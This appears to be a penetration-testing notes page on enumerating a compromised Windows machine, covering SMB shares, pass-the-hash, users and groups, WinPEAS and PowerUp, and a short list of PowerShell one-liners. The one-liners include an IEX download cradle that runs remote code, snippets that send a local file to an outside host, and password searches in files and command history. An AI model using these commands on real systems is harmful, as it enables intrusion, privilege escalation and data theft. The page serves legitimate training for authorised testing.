---
description: >-
  Get information about a compromised machine from the to find possible ways to
  escalate privileges
---

# Enumeration

## SMB

SMB (Server Message Block) is a protocol used mainly for sharing files on a local network. One server has multiple _shares_ that contain a filesystem with directories and files. List shares on a server using `smbclient -L` and then connect to any one of them to read/write files:

<pre class="language-bash"><code class="lang-bash"><strong>smbclient -L //10.10.10.10 -U $USERNAME --password $PASSWORD
</strong># Alternative using nxc:
<strong>nxc smb 10.10.10.10 -u $USERNAME -p $PASSWORD --shares
</strong></code></pre>

Then when you have found a share, you can use commands like `ls` and `cd` to traverse the filesystem, and `get <FILENAME>` to download anything. If you have write permissions, the `put` command also lets you upload files.\
To download all files recursively and look at them locally, use the following 4 commands:

```shell-session
$ mkdir smb && cd smb
$ smbclient //10.10.10.10/share -U $USERNAME --password $PASSWORD
> mask ""
> recurse ON
> prompt OFF
> mget *
```

{% hint style="info" %}
By passing `--pw-nt-hash` instead of `--password`, you can specify an NTLM hash for the user to perform pass-the-hash:

<pre class="language-bash"><code class="lang-bash"><strong>smbclient //10.10.10.10/share -U $USERNAME --pw-nt-hash $NTLM_HASH
</strong></code></pre>
{% endhint %}

## Users

Users are important to understand on a computer or domain because they might have different or higher permissions than your current user. By understanding exactly how the users relate to each other and how privileges can be abused, you can quickly escalate privileges to reach the crown jewels.&#x20;

For domain users/groups, [#bloodhound](active-directory-privilege-escalation.md#bloodhound "mention") can enumerate and analyze all the connections between them for a better understanding, and possible privilege escalation methods.&#x20;

### Current User

The `whoami` command can tell you what user you are running as, as well as some more detailed information about privileges and groups, using the `/all` flag:

```powershell
whoami /all
```

First comes simply the username, and their SID. The part before the `\` tells you where the user comes from. If this is the same as the output for the `hostname` command, it is a local user on that computer.&#x20;

<pre class="language-powershell"><code class="lang-powershell">USER INFORMATION
----------------

User Name        SID
================ ==============================================
<strong>WORKSTATION\user S-1-5-21-5386719015-7638691639-2457330780-1001
</strong></code></pre>

Next is the group information containing all the groups you are in. Some default ones you will always find here, but others have interesting properties. Like `BUILTIN\Remote Desktop Users` which allows logging in via RDP (port 3389), or custom groups that have a long SID.

You will also always find the `Mandatory Label\...`, called "Integrity level". It is used as a base for what actions you can and can't do. It may have one of the following values:

1. **System**: SYSTEM (kernel, ...)
2. **High**: Elevated users (Administrators, with "Run as Administrator")
3. **Medium**: Standard users (default, most often seen)
4. **Low**: Restricted rights often used in sandboxed processes or for directories storing temporary data
5. **Untrusted**: Lowest integrity level with extremely limited access rights for processes or objects that pose the most potential risk

<pre class="language-powershell"><code class="lang-powershell">GROUP INFORMATION
-----------------

Group Name                           Type             SID                                            Attributes
==================================== ================ ============================================== ==================================================
Everyone                             Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
<strong>WORKSTATION\group                    Alias            S-1-5-21-5386719015-7638691639-2457330780-1008 Mandatory group, Enabled by default, Enabled group
</strong><strong>BUILTIN\Remote Desktop Users         Alias            S-1-5-32-555                                   Mandatory group, Enabled by default, Enabled group
</strong>BUILTIN\Users                        Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                   Well-known group S-1-5-3                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
<strong>Mandatory Label\High Mandatory Level Label            S-1-16-12288
</strong></code></pre>

Lastly, there are the [#privileges](local-privilege-escalation.md#privileges "mention"), which all have their own special thing that you are allowed to do with this privilege. Some privileges like `SeImpersonatePrivilege` can be abused.&#x20;

<pre><code>PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeSecurityPrivilege           Manage auditing and security log          Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
<strong>SeImpersonatePrivilege        Impersonate a client after authentication Enabled
</strong>SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
</code></pre>

### Local Users/Groups

While looking at our own user is interesting, we should be looking at how we attack other users, and exactly who to attack. To get all local users on a computer, use `Get-LocalUser` in PowerShell:

<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\> Get-LocalUser
</strong>
Name               Enabled Description
----               ------- -----------

Administrator      False   Built-in account for administering the computer/domain
<strong>user               True    
</strong>DefaultAccount     False   A user account managed by the system.
Guest              False   Built-in account for guest access to the computer/domain
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
</code></pre>

Users may be part of multiple **Groups**. There are many default groups windows uses, but custom ones can be made too. We can list them using `Get-LocalGroup` in PowerShell:

<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\> Get-LocalGroup
</strong>
Name                                Description
----                                -----------

<strong>group
</strong>Access Control Assistance Operators Members of this group can remotely query authorization attributes and permission...
Administrators                      Administrators have complete and unrestricted access to the computer/domain
Backup Operators                    Backup Operators can override security restrictions for the sole purpose of back...
Cryptographic Operators             Members are authorized to perform cryptographic operations.
Device Owners                       Members of this group can change system-wide settings.
Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this ...
Event Log Readers                   Members of this group can read event logs from local machine
Guests                              Guests have the same access as members of the Users group by default, except for...
Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of H...
IIS_IUSRS                           Built-in group used by Internet Information Services.
Network Configuration Operators     Members in this group can have some administrative privileges to manage configur...
Performance Log Users               Members of this group may schedule logging of performance counters, enable trace...
Performance Monitor Users           Members of this group can access performance counter data locally and remotely
Power Users                         Power Users are included for backwards compatibility and possess limited adminis...
Remote Desktop Users                Members in this group are granted the right to logon remotely
Remote Management Users             Members of this group can access WMI resources over management protocols (such a...
Replicator                          Supports file replication in a domain
System Managed Accounts Group       Members of this group are managed by the system.
Users                               Users are prevented from making accidental or intentional system-wide changes an...
</code></pre>

Lastly, to learn who are the members of a group, we can use `Get-LocalGroupMember`:

```
PS C:\> Get-LocalGroupMember group

ObjectClass Name                  PrincipalSource
----------- ----                  ---------------
User        WORKSTATION\user      Local
```

{% hint style="info" %}
**Tip**: Requesting this for the`Administrators` group tells you who to target!
{% endhint %}

### Domain Users/Groups

Local users/groups only work on one computer, but domain users/groups work on all domain-joined computers. To list all domain users, use the `net user` command with the `/domain` flag:

<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\> net user /domain
</strong>
User accounts for \\DC1.corp.com
-------------------------------------------------------------------------------
Administrator            user1                     Guest
user2                    admin1                    admin2
krbtgt
</code></pre>

There you find some default users like _Administrator_, _Guest_, and _krbtgt_, but also all other users on the domain. To get more detailed information about one user, include their name in the command:

<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\> net user "admin1" /domain
</strong>
User name                    admin1 
Full Name
Comment
User's comment
...

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
</code></pre>

These users can also be part of groups, which you can list. There are several default groups all with their own special _group policies_ saying what they can and can't do. List them with `net group`:&#x20;

<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\> net group /domain
</strong>
Group Accounts for \\DC1.corp.com

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*Debug
<strong>*Development
</strong>*DnsUpdateProxy
<strong>*Domain Admins
</strong>*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
</code></pre>

If we want to learn more about a custom group, or just see who is a member of the group, we can also include that group name in the command:

<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\> net group "Development" /domain
</strong>
Group name     Development
Comment

Members
-------------------------------------------------------------------------------
<strong>user2
</strong></code></pre>

## Useful Commands

This section contains a set of useful commands for CMD or PowerShell that you'll often look for while enumerating a compromised machine.&#x20;

### WinPEAS / PowerUp.ps1

Before doing manual enumeration, getting an idea of the system through automated means might be quicker. The [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) script is a Windows equivalent to the well-known LinPEAS script for Linux. It enumerates many common misconfigurations in the system and tries to find vulnerabilities. This generates a lot of output to sift through, but it is a very useful output that normally would require a ton of manual work.&#x20;

To run it, download the latest `winPEASany.exe` from the [Releases ](https://github.com/carlospolop/PEASS-ng/releases)page and download it from a local HTTP server if your target cannot access the public internet:

{% code title="Run WinPEAS" overflow="wrap" %}
```powershell
cd /Windows/Tasks  # world-writable directory
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -o winPEASany.exe
.\winPEASany.exe | Tee-Object winPEAS.txt  # write output to a file (may take long)
```
{% endcode %}

Another such tool is [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) which looks for more directly exploitable vulnerabilities and has commands to automatically exploit them too:

{% code title="Run PowerUp.ps1" overflow="wrap" %}
```powershell
wget https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/PowerUp.ps1 -o PowerUp.ps1
# It is a Module, and to import it we need to disable the execution policy
powershell -ep bypass
. .\PowerUp.ps1
# Now that it is imported into the current shell, we can run its commands
Invoke-PrivescAudit
```
{% endcode %}

### Networking

<pre class="language-powershell" data-title="nc -v $IP $PORT"><code class="lang-powershell"><strong>Test-NetConnection -Port 22 10.10.10.10
</strong></code></pre>

<pre class="language-powershell" data-title="nmap -p $PORTS $IP" data-overflow="wrap"><code class="lang-powershell"><strong>1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.10", $_)) "TCP port $_ is open"} 2>$null
</strong></code></pre>

&#x20;<mark style="color:blue;">**↳**</mark> The above loop is **very slow** because it goes through ports one by one with a timeout

<pre class="language-powershell" data-title="SMB: List shares on dc01"><code class="lang-powershell"><strong>net view \\dc01 /all
</strong></code></pre>

<pre class="language-powershell" data-title="Interactive netcat"><code class="lang-powershell">dism /online /Enable-Feature /FeatureName:TelnetClient

<strong>telnet 10.10.10.10 25  # SMTP
</strong></code></pre>

&#x20;<mark style="color:blue;">**↳**</mark> This feature needs to be already enabled, or enabled by you as an administrator

{% code title="wget $URL -O $FILE" %}
```powershell
iwr http://10.10.10.10/file.txt -o file.txt
```
{% endcode %}

{% code title="curl $IP | sh" %}
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/script.ps1');
```
{% endcode %}

<pre class="language-powershell" data-title="nc $IP $PORT < $FILE"><code class="lang-powershell">$client = New-Object System.Net.Sockets.TcpClient
<strong>$client.Connect("10.10.10.10", 8000)
</strong>$writer = New-Object System.IO.StreamWriter($client.GetStream())
<strong>$bytes = (Get-Content -Encoding byte "C:\Windows\win.ini")
</strong>$writer.BaseStream.Write($bytes, 0, $bytes.Length)
$writer.Flush()
</code></pre>

&#x20;<mark style="color:blue;">**↳**</mark> For larger file transfers, you can also do this over HTTP with [`python3 -m uploadserver`](https://pypi.org/project/uploadserver/):

```powershell
curl.exe -X POST http://10.10.10.10:8000/upload -F 'files=@C:\Windows\win.ini'
```

### Files

<pre class="language-powershell" data-title="find"><code class="lang-powershell"><strong>Get-ChildItem -File -Recurse -ErrorAction SilentlyContinue
</strong># Or to get a nice tree view:
<strong>tree /F
</strong></code></pre>

<pre class="language-powershell" data-title="grep -ri $PATTERN"><code class="lang-powershell"><strong>dir -Recurse | Select-String -Pattern "password"
</strong></code></pre>

<pre class="language-powershell" data-title="Check permissions"><code class="lang-powershell"><strong>icacls C:\Path\To\DirOrFile
</strong># Output reference: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls#remarks
</code></pre>

{% code title="List disks (C:\, D:\, etc.)" %}
```powershell
wmic logicaldisk get deviceid,volumename,description
```
{% endcode %}

### Miscellaneous

<pre class="language-powershell" data-title="history" data-overflow="wrap"><code class="lang-powershell"><strong>Get-History
</strong># Raw method below can bypass Clear-History
<strong>type (Get-PSReadlineOption).HistorySavePath
</strong># Get verbose script block events (may be large)
<strong>Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath "*[System[EventID=4104]]" | Export-Csv -Path 'ScriptBlockEvents.csv' -NoTypeInformation
</strong></code></pre>

<pre class="language-powershell" data-title="Get ACEs from username" data-overflow="wrap"><code class="lang-powershell">Import-Module .\PowerView.ps1
<strong>$sid = (get-domainuser j0r1an).objectsid
</strong><strong>Get-ObjectACL | ? {$_.SecurityIdentifier -eq $sid} | select ObjectDN,ActiveDirectoryRights
</strong></code></pre>

<pre class="language-powershell" data-title="Manage Services"><code class="lang-powershell"># List all services
<strong>Get-CimInstance -ClassName win32_service | Select Name,State,PathName
</strong># Start/stop a service if you are allowed
<strong>net stop $SERVICE_NAME
</strong><strong>net start $SERVICE_NAME
</strong></code></pre>

### Living Off The Land (LOLBAS)

{% embed url="https://lolbas-project.github.io/" %}
A list of **builtin** Windows binaries and commands that can _download_, _execute_ and do other interesting things
{% endembed %}
